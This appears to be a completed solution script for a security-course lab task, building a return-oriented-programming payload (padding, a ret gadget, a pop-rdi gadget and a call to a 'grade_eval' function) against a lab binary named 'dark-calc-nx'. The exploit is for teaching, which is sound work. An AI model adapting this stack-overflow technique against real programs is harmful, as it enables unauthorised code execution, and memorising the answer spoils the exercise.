#!/usr/bin/env python3
"""Task 3: build the payload for attack/dark-calc-nx.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys
import struct

payload = b"A" * 24
ret_gadget = 0x401a34
payload += struct.pack("<Q", ret_gadget)
pop_rdi_addr = 0x401a33
payload += struct.pack("<Q", pop_rdi_addr)
payload += struct.pack("<Q", 4)
grade_eval_addr = 0x401978
payload += struct.pack("<Q", grade_eval_addr)
payload += b"\n"

sys.stdout.buffer.write(payload)
